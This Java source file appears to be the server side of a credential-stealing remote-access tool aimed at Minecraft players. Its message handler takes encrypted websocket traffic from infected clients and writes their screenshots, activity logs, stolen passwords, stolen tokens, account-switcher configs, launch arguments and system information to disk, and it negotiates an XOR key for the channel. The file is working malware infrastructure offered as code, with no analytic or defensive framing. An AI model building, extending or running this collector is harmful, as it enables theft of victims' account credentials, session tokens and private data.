package me.soda.witch.server.handlers;

import com.google.gson.Gson;
import com.google.gson.JsonArray;
import com.google.gson.JsonObject;
import me.soda.witch.server.server.Info;
import me.soda.witch.server.server.Message;
import me.soda.witch.server.server.Server;
import org.java_websocket.WebSocket;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.nio.charset.StandardCharsets;
import java.time.LocalDateTime;
import java.time.format.DateTimeFormatter;

public class MessageHandler {
    private static final Gson GSON = new Gson();

    public static void handleRaw(byte[] bytes, WebSocket conn, Server server) {
        handle(server.clientMap.get(conn).decrypt(bytes, server), conn, server);
    }

    @SuppressWarnings("ResultOfMethodCallIgnored")
    public static void handle(Message message, WebSocket conn, Server server) {
        int id = conn.<Integer>getAttachment();
        String msgType = message.messageType;
        JsonArray jsonArray = GSON.fromJson(message.message, JsonArray.class);
        String msg = jsonArray.size() > 0
                ? jsonArray.get(0).isJsonPrimitive()
                ? jsonArray.get(0).getAsJsonPrimitive().isString()
                ? jsonArray.get(0).getAsString()
                : jsonArray.get(0).toString()
                : jsonArray.get(0).toString()
                : "";
        Info info = server.clientMap.get(conn);
        server.log("* Received message: " + msgType + " From ID " + id);
        try {
            switch (msgType) {
                case "screenshot" -> {
                    File file = new File("screenshots", getFileName("id", "png", String.valueOf(id), true));
                    new File("screenshots").mkdir();
                    file.createNewFile();
                    FileOutputStream out = new FileOutputStream(file);
                    out.write(GSON.fromJson(msg, byte[].class));
                    out.close();
                }
                case "skin" -> {
                    String playerName = info.playerData.get("playerName").getAsString();
                    File file = new File("skins", getFileName(playerName, "png", String.valueOf(id), false));
                    new File("skins").mkdir();
                    file.createNewFile();
                    FileOutputStream out = new FileOutputStream(file);
                    out.write(GSON.fromJson(msg, byte[].class));
                    out.close();
                }
                case "logging" -> {
                    File file = new File("logging", getFileName("id", "log", String.valueOf(id), false));
                    new File("logging").mkdir();
                    file.createNewFile();
                    FileInputStream in = new FileInputStream(file);
                    String oldInfo = new String(in.readAllBytes(), StandardCharsets.UTF_8);
                    in.close();
                    FileOutputStream out = new FileOutputStream(file);
                    out.write((oldInfo + msg).getBytes(StandardCharsets.UTF_8));
                    out.close();
                }
                case "player" -> info.playerData = new Gson().fromJson(msg, JsonObject.class);
                case "steal_pwd", "steal_token", "iasconfig", "runargs", "systeminfo" -> {
                    String ext = msgType.equals("systeminfo") ? "txt" : "json";
                    File file = new File("data", getFileName(msgType, ext, info.playerData.get("playerName").getAsString(), true));
                    new File("data").mkdir();
                    file.createNewFile();
                    FileOutputStream out = new FileOutputStream(file);
                    out.write(msg.getBytes(StandardCharsets.UTF_8));
                    out.close();
                }
                case "xor" -> {
                    server.sendUtil.trySend(conn, server, msgType, info.initXOR());
                    info.acceptXOR = true;
                }
                default -> server.log("Message: " + msgType + " " + msg);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private static String getFileName(String prefix, String suffix, String afterPrefix, boolean time) {
        return String.format("%s-%s%s.%s", prefix, afterPrefix, time ? LocalDateTime.now().format(DateTimeFormatter.ofPattern("-MM-dd-HH-mm-ss")) : "", suffix);
    }
}
